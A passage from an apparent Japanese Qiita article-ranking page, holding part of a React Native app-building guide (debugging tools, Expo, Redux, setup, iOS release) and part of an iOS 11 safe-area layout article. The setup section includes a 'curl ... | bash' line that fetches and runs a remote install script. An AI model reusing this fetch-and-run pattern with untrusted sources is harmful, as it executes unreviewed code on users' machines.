<span id="reactoron" class="fragment"></span><a href="#reactoron"><i class="fa fa-link"></i></a>Reactoron</h3>

<p>ReactoronはReact(native以外にも使用可能）のデバッグのためのDesktop Appで、</p>

<p><code>reactotron-react-native</code> と <code>reactotron-redux</code> をパッケージに追加し設定を行えばredux storeの中身やdispatch履歴を見ることが出来ます。</p>

<p><a href="https://camo.qiitausercontent.com/e50764863dd34b39f7ff8552037b9aec894e1730/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f38646134653266342d393362352d356636632d333262342d3931653463643864306535382e706e67" target="_blank" rel="nofollow noopener"><img width="520" alt="Screen Shot 2017-11-24 at 8.17.25 AM.png" src="https://camo.qiitausercontent.com/e50764863dd34b39f7ff8552037b9aec894e1730/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f38646134653266342d393362352d356636632d333262342d3931653463643864306535382e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/30440/8da4e2f4-93b5-5f6c-32b4-91e4cd8d0e58.png"></a></p>

<p><a href="https://camo.qiitausercontent.com/add2e6d12c35895e0580603d5e6a0eab30e2bf16/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f62666532376236362d313830302d623361302d323131352d6236613835396364333865392e706e67" target="_blank" rel="nofollow noopener"><img width="915" alt="Screen Shot 2017-10-10 at 8.15.14 AM.png" src="https://camo.qiitausercontent.com/add2e6d12c35895e0580603d5e6a0eab30e2bf16/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f62666532376236362d313830302d623361302d323131352d6236613835396364333865392e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/30440/bfe27b66-1800-b3a0-2115-b6a859cd38e9.png"></a></p>

<p>Reactoronの設定はとても簡単で、<code>reactotron-react-native</code> と <code>reactotron-redux</code>をパッケージに追加し、</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>import Reactotron from 'reactotron-react-native';
import { reactotronRedux } from 'reactotron-redux';

Reactotron
  .configure({ name: 'Ikinari' })
  .use(reactotronRedux())
  .connect();
...

const store = Reactotron.createStore(
  reducers,
  initialState,
  enhancer
);
</pre></div></div>

<p>の様にstoreを作成すれば、設定完了です。</p>

<h3>
<span id="expo" class="fragment"></span><a href="#expo"><i class="fa fa-link"></i></a>Expo</h3>

<p><a href="https://camo.qiitausercontent.com/5f3e66e94c70ea9331108f125196ee3ea93c755d/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f66623232383938632d383537342d363433342d393564642d3436633437633464313334302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5f3e66e94c70ea9331108f125196ee3ea93c755d/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f66623232383938632d383537342d363433342d393564642d3436633437633464313334302e706e67" alt="1-fTOXQ1j-0I5xe9BN98Hwwg.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/30440/fb22898c-8574-6434-95dd-46c47c4d1340.png"></a></p>

<p>最初、<code>create-react-native-app</code> 使って技術調査をしていた兼ね合いもあって、<br>
「Expo最高じゃん〜」と思って使っていました。（実際すごいです</p>

<p>Expoはnativeの機能を全てjsでラッピングしたExpo SDKなるものを開発しておりそれを使ったExpoエコシステムの上に乗っていると <strong>jsだけアプリ開発が完結する</strong> と思想なのですが <code>detach</code> と呼ばれる黒魔術を使わぬ限りnative（swift, objc, java）のコードが書けなくなってしまいます。</p>

<p><a href="https://docs.expo.io/versions/latest/guides/detach.html" class="autolink" rel="nofollow noopener" target="_blank">https://docs.expo.io/versions/latest/guides/detach.html</a></p>

<p>detachは一応試みましたが、謎なPodfileが生成されて無理やりブリッジしてる感がすごかったので諦めました。彼らもまだβ featureと言っています。</p>

<p>またExpoはXDEというツールやiosとandroidのexpo clientを使えばアプリを一瞬で不特定多数の実機に飛ばせるなど色々すごいんですが、そこに必要性を見出せなかったのと諸々不安定であったので（謎のメモリリークがv0.17.0ではあり、捨てたら治りました。）途中から <code>react-native init</code> をし直してコードを移植しました。</p>

<p>ただfounderがquoraのco-founderで元facebookerでチームもすごくいけてるので（linkdeinは全員チェックしましたw）今後に期待大です。頑張って欲しい。</p>

<h2>
<span id="redux" class="fragment"></span><a href="#redux"><i class="fa fa-link"></i></a>Redux</h2>

<p><a href="https://camo.qiitausercontent.com/779dfeacbb3015c05449d0b94ee31c5f5cc10133/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f65333966363333362d613835372d333039632d366132362d6466313734666164336262302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/779dfeacbb3015c05449d0b94ee31c5f5cc10133/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f65333966363333362d613835372d333039632d366132362d6466313734666164336262302e706e67" alt="Untitled 2.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/30440/e39f6336-a857-309c-6a26-df174fad3bb0.png"></a></p>

<p>Reduxはfluxフレームワークの一つで、一つの大きなStoreと呼ばれる状態を一元管理するオブジェクトをdispatchと呼ばれる関数を介して変更をしその変更をViewに伝達することによってアプリケーションの動きを作っています。</p>

<p>Store以外からComponentをまたがる状態が変わることがないので管理がしやすい、という訳です。</p>

<p>筆者も実際にこの恩恵には充分預かり非常に快適なアプリ開発をさせてもらいました。</p>

<p>おすすめです。<br>
<a href="https://github.com/infinitered/reactotron" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/infinitered/reactotron</a><br>
というデバッグツールが大変おすすめです。</p>

<h1>
<span id="react-nativeアプリの作り方mac編" class="fragment"></span><a href="#react-native%E3%82%A2%E3%83%97%E3%83%AA%E3%81%AE%E4%BD%9C%E3%82%8A%E6%96%B9mac%E7%B7%A8"><i class="fa fa-link"></i></a>React Nativeアプリの作り方(mac編)</h1>

<p>この部分は公式ドキュメントであったり、記事が多いので控えめに記しておきます。</p>

<h2>
<span id="nvmnodeのバージョン管理のインストール" class="fragment"></span><a href="#nvmnode%E3%81%AE%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3%E7%AE%A1%E7%90%86%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB"><i class="fa fa-link"></i></a>nvm（nodeのバージョン管理）のインストール</h2>

<p><a href="https://github.com/creationix/nvm" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/creationix/nvm</a></p>

<p>を使用しました。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.6/install.sh | bash
</pre></div></div>

<p>でnvmをインストールし、</p>

<p>お使いのshell configに</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] &amp;&amp; . "$NVM_DIR/nvm.sh"
</pre></div></div>

<p>を記述しましょう。</p>

<p>これで</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>nvm install v6.11.0 
nvm use v6.11.0
</pre></div></div>

<p>こんな感じでnodeをインストール出来ます。</p>

<h2>
<span id="yarnとreact-native-cli" class="fragment"></span><a href="#yarn%E3%81%A8react-native-cli"><i class="fa fa-link"></i></a>yarnとreact-native-cli</h2>

<p>better npmなポジションであるyarnを使います。 <br>
npmより高速で、きちっとしたバージョン管理が出来ます。</p>

<p><code>react-native-cli</code> はReact Nativeアプリの作成やコンパイルをするときに使います。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>npm install -g yarn react-native-cli
</pre></div></div>

<h2>
<span id="プロジェクトのinitialize" class="fragment"></span><a href="#%E3%83%97%E3%83%AD%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E3%81%AEinitialize"><i class="fa fa-link"></i></a>プロジェクトのinitialize</h2>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>react-native init TestApp
</pre></div></div>

<p>でプロジェクトのinitializeは完了。</p>

<p>iosフォルダに入っている <code>TestApp.xcodeproj</code> をxcodeで開き</p>

<p><a href="https://camo.qiitausercontent.com/3a306aa3e8963d73a1a8fbe746ed3b62f2e908b8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f38633331373435652d623134322d336363342d633434612d6362393766383436356265342e706e67" target="_blank" rel="nofollow noopener"><img width="751" alt="Screen Shot 2017-11-24 at 9.32.03 AM.png" src="https://camo.qiitausercontent.com/3a306aa3e8963d73a1a8fbe746ed3b62f2e908b8/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f38633331373435652d623134322d336363342d633434612d6362393766383436356265342e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/30440/8c31745e-b142-3cc4-c44a-cb97f8465be4.png"></a></p>

<p>左上の再生ボタンみたいなやつでビルドしてみよう。</p>

<p><a href="https://camo.qiitausercontent.com/c65606a268382d4e580a957e581dac809d815b44/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f30316636306465332d313630372d383361352d303735642d3035303065313864636637652e706e67" target="_blank" rel="nofollow noopener"><img width="360" alt="Screen Shot 2017-11-24 at 9.33.46 AM.png" src="https://camo.qiitausercontent.com/c65606a268382d4e580a957e581dac809d815b44/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f30316636306465332d313630372d383361352d303735642d3035303065313864636637652e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/30440/01f60de3-1607-83a5-075d-0500e18dcf7e.png"></a></p>

<h2>
<span id="開発tips" class="fragment"></span><a href="#%E9%96%8B%E7%99%BAtips"><i class="fa fa-link"></i></a>開発Tips</h2>

<h3>
<span id="debugger" class="fragment"></span><a href="#debugger"><i class="fa fa-link"></i></a>debugger</h3>

<p>jsのdebuggerを使って作業をすることができます。<br>
Macだと⌘+Dで開く<br>
<a href="https://camo.qiitausercontent.com/2de14969cea583f4aa270702f16652235b72ae4c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f31613731313261322d343762312d386366632d616236612d3661636364633764646461372e706e67" target="_blank" rel="nofollow noopener"><img width="478" alt="Screen Shot 2017-10-10 at 8.04.36 AM.png" src="https://camo.qiitausercontent.com/2de14969cea583f4aa270702f16652235b72ae4c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f31613731313261322d343762312d386366632d616236612d3661636364633764646461372e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/30440/1a7112a2-47b1-8cfc-ab6a-6accdc7ddda7.png"></a><br>
上記画面よりDebug JS Remotelyを選択し、<br>
ブラウザで ⌘+Shift+Cでinspectorをひらけば、ここでdebuggerが実行された文脈で処理を止め、コードを実行することで出来ます。</p>

<p><a href="https://camo.qiitausercontent.com/23cf9f29d2b8a97b5a57722600b2873d6f401df2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f32313534356162662d366634362d373461382d336531372d3362633632353230326633322e706e67" target="_blank" rel="nofollow noopener"><img width="1439" alt="Screen Shot 2017-10-10 at 8.05.35 AM.png" src="https://camo.qiitausercontent.com/23cf9f29d2b8a97b5a57722600b2873d6f401df2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f32313534356162662d366634362d373461382d336531372d3362633632353230326633322e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/30440/21545abf-6f46-74a8-3e17-3bc625202f32.png"></a></p>

<h3>
<span id="view-inspector" class="fragment"></span><a href="#view-inspector"><i class="fa fa-link"></i></a>View inspector</h3>

<p>⌘+Dから「Show Inspector」を選択すればbrowserのinspectorのようなものが使えます。<br>
<a href="https://camo.qiitausercontent.com/a8e7cf1b75f2e46e6229918de287ae84294bb306/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f39626431623862642d323266302d636430392d316430382d3764663635393635643637392e706e67" target="_blank" rel="nofollow noopener"><img width="446" alt="Screen Shot 2017-10-10 at 8.09.00 AM.png" src="https://camo.qiitausercontent.com/a8e7cf1b75f2e46e6229918de287ae84294bb306/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f39626431623862642d323266302d636430392d316430382d3764663635393635643637392e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/30440/9bd1b8bd-22f0-cd09-1d08-7df65965d679.png"></a></p>

<h3>
<span id="r" class="fragment"></span><a href="#r"><i class="fa fa-link"></i></a>⌘+R</h3>

<p>でソースコードの更新を反映出来ます。（Hot Reloadも可能）</p>

<h2>
<span id="機能別開発tips" class="fragment"></span><a href="#%E6%A9%9F%E8%83%BD%E5%88%A5%E9%96%8B%E7%99%BAtips"><i class="fa fa-link"></i></a>機能別開発tips</h2>

<p>機能開発のざっとしたサマリーを載せておきます。</p>

<h3>
<span id="push通知" class="fragment"></span><a href="#push%E9%80%9A%E7%9F%A5"><i class="fa fa-link"></i></a>Push通知🚀</h3>

<p><a href="https://github.com/evollu/react-native-fcm" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/evollu/react-native-fcm</a></p>

<p>を使って、fcm_tokenをアプリ側で取得し、apiを作ってuserに紐付ける形でdbに保管します。<br>
push通知を送りたい時はfcm_tokenとfirebaseの秘密鍵を使用してfirebaseのAPIを叩くという実装にしています。（faradayなどのhttp clientで）</p>

<h3>
<span id="facebookログイン" class="fragment"></span><a href="#facebook%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3"><i class="fa fa-link"></i></a>Facebookログイン🚪</h3>

<p><a href="https://github.com/magus/react-native-facebook-login" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/magus/react-native-facebook-login</a></p>

<p>を使っています。README.mdがよく書かれているので読み込むと良いと思います。<br>
(Androidのkeytoreまわりは結構苦労し、android経験者に助けてもらったりしました）</p>

<p>アプリでfb_tokenを取得し、apiを作ってdbに保管し、facebookのAPIクライアントで各種情報を取得しています。</p>

<h3>
<span id="クレカ決済" class="fragment"></span><a href="#%E3%82%AF%E3%83%AC%E3%82%AB%E6%B1%BA%E6%B8%88"><i class="fa fa-link"></i></a>クレカ決済💳</h3>

<p>特にライブラリを使っていないです。<code>fetch</code> を使ってStripeのAPIを直接叩いています。</p>

<h3>
<span id="画像アップロード" class="fragment"></span><a href="#%E7%94%BB%E5%83%8F%E3%82%A2%E3%83%83%E3%83%97%E3%83%AD%E3%83%BC%E3%83%89"><i class="fa fa-link"></i></a>画像アップロード📷</h3>

<p><a href="https://github.com/react-community/react-native-image-picker" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/react-community/react-native-image-picker</a><br>
を使っています。README.mdがよく書かれているので読み込むと良いと思います。</p>

<h3>
<span id="各種crud" class="fragment"></span><a href="#%E5%90%84%E7%A8%AEcrud"><i class="fa fa-link"></i></a>各種CRUD</h3>

<p>それぞれのComponent内の <code>state</code> としてフォームの情報を格納し、<br>
actionにstateを送り、action内でAPIを値と一緒に叩き、返り値によってdispatchをしてviewに変更を加える、という流れを取っています。</p>

<h1>
<span id="リリースの仕方ios編" class="fragment"></span><a href="#%E3%83%AA%E3%83%AA%E3%83%BC%E3%82%B9%E3%81%AE%E4%BB%95%E6%96%B9ios%E7%B7%A8"><i class="fa fa-link"></i></a>リリースの仕方（ios編）</h1>

<p>基本的にはswiftで作られたiosアプリと同じ流れの様です。簡単にまとめておきます。</p>

<p><a href="https://camo.qiitausercontent.com/63d08b896ae921f5a937499642b69c7386a12b77/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f39363538616635362d623461362d343138662d373536342d6533663834663661373837372e706e67" target="_blank" rel="nofollow noopener"><img width="546" alt="Screen_Shot_2017-11-24_at_7_20_39_AM.png" src="https://camo.qiitausercontent.com/63d08b896ae921f5a937499642b69c7386a12b77/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f39363538616635362d623461362d343138662d373536342d6533663834663661373837372e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/30440/9658af56-b4a6-418f-7564-e3f84f6a7877.png"></a></p>

<p>本番用のschemaを作りDeviceに「Generic iOS Device」を選択します。</p>

<p><a href="https://camo.qiitausercontent.com/feb6411d06bebc1073aa8ef366520eb7b0fca0e3/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f63633333373263312d353130632d613465302d313030302d3866653235386336303936612e706e67" target="_blank" rel="nofollow noopener"><img width="218" alt="Screen Shot 2017-11-24 at 8.20.56 AM.png" src="https://camo.qiitausercontent.com/feb6411d06bebc1073aa8ef366520eb7b0fca0e3/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33303434302f63633333373263312d353130632d613465302d313030302d3866653235386336303936612e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/30440/cc3372c1-510c-a4e0-1000-8fe258c6096a.png"></a></p>

<p>Product から 「Archive」を選び諸々設定をします。</p>

<p>あとは勝手にitunes connectにあげてくれるのでTestflightなりリリース申請なりしましょう💪</p>

<h1>
<span id="締め" class="fragment"></span><a href="#%E7%B7%A0%E3%82%81"><i class="fa fa-link"></i></a>締め</h1>

<p>どうだったでしょうか。一部駆け足となるところもありましたが、是非、React Native採用の後押しになればと思います。また弊社(<a href="http://aisaac.in/" rel="nofollow noopener" target="_blank">aisaac inc.</a>) はReact Nativeによるアプリ開発やコミュニティ作りに力を入れています。是非アプリ制作のご相談や興味のある技術者の方はお声がけお願いします！m_ _m</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">89位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>106</kbd>
		<a target="_blank" href="https://qiita.com/aqubi/items/8b3c4dcd208e2581184d">iOS11のInsetsとLayout</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-16<br />04:22:48</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/1380.html">aqubi</a>(7件の記事)<br />(Flask LLP 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/1380/profile-images/1473683412">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[iOS]</b> <b>[UIKit]</b> <b>[ios11]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="insets" class="fragment"></span><a href="#insets"><i class="fa fa-link"></i></a>Insets</h1>

<p><a href="https://camo.qiitausercontent.com/e72ba1df2ead3bd9ecd827bd8a844d6aecb36814/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f313338302f34373032333661312d616535372d323734392d373039352d3461353339393461643338342e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/e72ba1df2ead3bd9ecd827bd8a844d6aecb36814/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f313338302f34373032333661312d616535372d323734392d373039352d3461353339393461643338342e706e67" alt="views.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/1380/470236a1-ae57-2749-7095-4a53994ad384.png"></a></p>

<p>半透明のナビゲーションバーやタブバーを配置して、下のテーブルの内容が潜り込んで見えるようにする場合、Insetsでその量を指定します。<br>
iOS10の時は、「Adjust Scroll View Insets」にチェックを入れると、配置しているTableViewなどScrollView系のコンポーネントのContentInsetsが自動的に設定される仕組みになっていました。<br>
<a href="https://camo.qiitausercontent.com/645da6ca33645952786b365f49e0fe761a0cbd7b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f313338302f32313263376565332d623964642d366633332d373733372d3066643465613733396531362e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/645da6ca33645952786b365f49e0fe761a0cbd7b/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f313338302f32313263376565332d623964642d366633332d373733372d3066643465613733396531362e706e67" alt="adjustInsets.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/1380/212c7ee3-b9dd-6f33-7737-0fd4ea739e16.png"></a></p>

<p>iOS11からは、contentInsetsではなく、SafeAreaInsets → adjustedContentInset にその量が反映されるようになります。<br>
「Adjust Scroll View Insets」(コードでは UIViewController.automaticallyAdjustsScrollViewInsets)はiOS11でdeprecatedになりました。</p>

<p>Viewのレイアウトも、iOS11でSafeAreaLayoutGuidesが追加され、UIViewControllerのtopLayoutGuide, bottomLayoutGuideがdeprecatedになりました。</p>

<p>Top/BottomLayoutGuideはUIViewControllerにありますが、SafeAreaLayoutGuidesはUIViewごとに存在します。<br>
この「UIViewごとにある」というのがポイントで、Viewを複数重ねた中にある子Viewに対してもSafeAreaGuideの制約を作ることができるようになりました！</p>

<p>さらに、追加されたUIViewController.additionalSafeAreaInsetsで追加が可能。<br>
タブバー/ナビバーを標準を使わず独自に作った時など...とかに使えそうです。</p>

<h1>
<span id="iphonexのサイズ" class="fragment"></span><a href="#iphonex%E3%81%AE%E3%82%B5%E3%82%A4%E3%82%BA"><i class="fa fa-link"></i></a>iPhoneXのサイズ</h1>

<p><a href="https://camo.qiitausercontent.com/e37c98573893f9e7a9cb00b5f80e78bc5c40b583/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f313338302f37653335636561382d363931352d633162612d623630342d3261356435616366353734372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/e37c98573893f9e7a9cb00b5f80e78bc5c40b583/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f313338302f37653335636561382d363931352d633162612d623630342d3261356435616366353734372e706e67" alt="iPhoneXPortrait.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/1380/7e35cea8-6915-c1ba-b604-2a5d5acf5747.png"></a></p>

<p><a href="https://camo.qiitausercontent.com/9457f54b5f07557624ceb742c3c5d3b03f3704f6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f313338302f37366332666266322d333032392d343366332d323037382d3633616233356339623965392e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/9457f54b5f07557624ceb742c3c5d3b03f3704f6/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f313338302f37366332666266322d333032392d343366332d323037382d3633616233356339623965392e706e67" alt="iPhoneXLandscape.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/1380/76c2fbf2-3029-43f3-2078-63ab35c9b9e9.png"></a></p>

<p>半透明なナビゲーションバー、タブバーを配置した時の各種サイズです。<br>
ステータスバーが20→44ptに代わり、BottomにHomeIndicatorのエリアとして34pt追加されます。<br>
端末を横にした時には左右のInsetsが44pt出てきます。</p>

<p>Table.layoutMarginの値は、「Preserve Superview Margins」がOFFの時の値です。</p>

<h1>
<span id="iphonexのbottom部分に色を塗る3つの方法" class="fragment"></span><a href="#iphonex%E3%81%AEbottom%E9%83%A8%E5%88%86%E3%81%AB%E8%89%B2%E3%82%92%E5%A1%97%E3%82%8B3%E3%81%A4%E3%81%AE%E6%96%B9%E6%B3%95"><i class="fa fa-link"></i></a>iPhoneXのBottom部分に色を塗る3つの方法</h1>

<p><a href="https://camo.qiitausercontent.com/9430b90c411add0f26b7eb329f21013e87807f21/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f313338302f62366534336133342d663635652d356666612d356666312d3462333936316566663031652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/9430b90c411add0f26b7eb329f21013e87807f21/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f313338302f62366534336133342d663635652d356666612d356666312d3462333936316566663031652e706e67" alt="Screen Shot 2017-10-16 at 3.33.01.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/1380/b6e43a34-f65e-5ffa-5ff1-4b3961eff01e.png"></a></p>

<p>こんな感じで色を塗りたい場合。</p>

<h2>
<span id="方法1" class="fragment"></span><a href="#%E6%96%B9%E6%B3%951"><i class="fa fa-link"></i></a>方法1</h2>

<p>Align Bottom to: Safe Areaにして、UIViewController.view.backgroundColorを同じ色で塗る。<br>
コレでいけるのであれば一番ラク。<br>
<a href="https://camo.qiitausercontent.com/5b13c93958feaffc522f2b5098f35506c63ae374/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f313338302f62323439306363652d326533632d313030662d383663342d3635366163386137323363652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5b13c93958feaffc522f2b5098f35506c63ae374/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f313338302f62323439306363652d326533632d313030662d383663342d3635366163386137323363652e706e67" alt="Screen Shot 2017-10-16 at 3.40.37.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/1380/b2490cce-2e3c-100f-86c4-656ac8a723ce.png"></a></p>

<h2>
<span id="方法2" class="fragment"></span><a href="#%E6%96%B9%E6%B3%952"><i class="fa fa-link"></i></a>方法2</h2>

<p>Viewを2つ使って、1つはAlign Bottom to: Safe Area、もう1つはBottom Space to: Superview に。<br>
この2つのViewのTop Edgeを同じにする。<br>
<a href="https://camo.qiitausercontent.com/52c97610438ec1cdea97481c25f81488fb8ba064/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f313338302f64323037363931392d346331382d323639342d336630332d3936393739313663653532392e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/52c97610438ec1cdea97481c25f81488fb8ba064/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f313338302f64323037363931392d346331382d323639342d336630332d3936393739313663653532392e706e67" alt="Screen Shot 2017-10-16 at 3.47.27.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/1380/d2076919-4c18-2694-3f03-9697916ce529.png"></a></p>

<p>派生版として、この2つのViewを続けて配置するパターンもあるが、0.5ptの隙間が開くことがあったのであまりオススメしない。</p>

<p><a href="https://camo.qiitausercontent.com/fb47ec5b7f4d592171e98821cb7da96b234bb501/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f313338302f61666366383861662d353431362d333136362d646632362d3035636661336634386239662e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/fb47ec5b7f4d592171e98821cb7da96b234bb501/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f313338302f61666366383861662d353431362d333136362d646632362d3035636661336634386239662e706e67" alt="Screen Shot 2017-10-16 at 4.00.55.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/1380/afcf88af-5416-3166-df26-05cfa3f48b9f.png"></a></p>

<h2>
<span id="方法3" class="fragment"></span><a href="#%E6%96%B9%E6%B3%953"><i class="fa fa-link"></i></a>方法3</h2>

<p>Storyboardの「Use Safe Area Layout Guides」をONにする。<br>
2つのViewを親子の階層にする。<br>
親のViewのSafe Area Layout Guideにチェックをいれる。<br>
<a href="https://camo.qiitausercontent.com/f8701fc44833f4f395e1b8895de0c2cd93fc4326/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f313338302f63373464393934642d316137642d303961652d653364642d3331386166623666383066322e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/f8701fc44833f4f395e1b8895de0c2cd93fc4326/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f313338302f63373464393934642d316137642d303961652d653364642d3331386166623666383066322e706e67" alt="Screen Shot 2017-10-16 at 4.05.56.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/1380/c74d994d-1a7d-09ae-e3dd-318afb6f80f2.png"></a></p>

<p>子ViewのBottomの制約を、Align Bottom to: Safe Area にする。<br>
